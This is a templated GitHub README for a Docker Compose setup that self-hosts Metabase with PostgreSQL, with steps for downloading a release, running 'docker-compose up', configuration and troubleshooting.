# 🎉 metabase-self-hosted - Easy Self-Host Metabase Setup

[![Download metabase-self-hosted](https://img.shields.io/badge/Download-metamap--self--hosted-brightgreen)](https://github.com/DarlanCavalcante/metabase-self-hosted/releases)

## 📖 Description

The metabase-self-hosted project provides a simple way to set up Metabase on your server with Docker Compose. This setup uses a PostgreSQL backend and includes useful management scripts for backup, updating, and restarting the service. With a shared network configuration, integrating your services becomes effortless.

## 🚀 Getting Started

To get started with metabase-self-hosted, follow these easy steps. You will download the latest release and run it on your machine.

## 🛠️ Prerequisites

Before you download metabase-self-hosted, ensure that you have the following:

1. **Docker**: This application runs in containers. Install Docker for your operating system.
2. **Docker Compose**: This tool helps manage multiple containers. Install Docker Compose as well.
3. **Basic Command Line Skills**: You will need to use a command line interface (CLI) to run some commands.

## 📥 Download & Install

1. **Visit the Releases Page**: Click the link below to go to the metabase-self-hosted releases page.
   
   [Visit Release Page](https://github.com/DarlanCavalcante/metabase-self-hosted/releases)

2. **Download the Latest Version**: Find the latest version available. It should be the first option on the release page. Click on it to download everything you need for installation.
  
3. **Extract the Files**: Once the download is complete, unzip the file to a folder on your machine. You will see various files needed to run Metabase.

4. **Configure the Setup**: Open the extracted folder and find the configuration files. Adjust any settings you may need such as database connection details.

5. **Start the Application**: Open your command line interface, navigate to the folder where you extracted the files using the `cd` command, then run:
   ```
   docker-compose up
   ```
   This command will start Metabase along with a PostgreSQL backend.

6. **Access Metabase**: After the containers are up and running, open a web browser and go to `http://localhost:3000`. You should now see the Metabase interface!

## 🗂️ Features

- **Production-Ready**: Designed to run in a live environment with stability in mind.
- **Docker Compose Integration**: Simplifies the deployment process with configuration defined in a single YAML file.
- **Management Scripts**: Easily backup, update, and restart your Metabase instance with included scripts.
- **PostgreSQL Support**: Utilizes PostgreSQL for robust database management.
- **Simple Network Configuration**: Connects easily with other services on the network.

## 📄 Configuration Tips

- **Environment Variables**: You can set environment variables in your `docker-compose.yml` file to customize behavior. 
- **Database Management**: Provide the correct PostgreSQL credentials in the configuration to successfully connect Metabase.
- **Backups**: Regularly run the backup script to keep your data safe.

## ❓ Troubleshooting

If you encounter issues while running metabase-self-hosted, check the following:

1. **Docker Installation**: Ensure Docker and Docker Compose are installed correctly by running `docker --version` and `docker-compose --version`.
2. **Internet Connection**: Your application requires an internet connection to pull the PostgreSQL image.
3. **Logs**: Check logs for more details if something goes wrong. You can find logs by using the following command:
   ```
   docker-compose logs
   ```

## 🤝 Contributing

If you'd like to contribute to metabase-self-hosted, consider the following:

1. **Report Issues**: If you find bugs, please report them at the Issues section of this repository.
2. **Pull Requests**: You can also submit pull requests for any enhancements or bug fixes.
3. **Documentation**: Help us improve the documentation by suggesting changes or new topics.

## 🪪 License

This project is licensed under the MIT License. Use it freely but respect the original author's contributions. 

## 📞 Support

For support, please create an issue on GitHub. Community members or maintainers will assist you as soon as possible. 

Remember to review the README for any updates or changes in instructions. Happy hosting!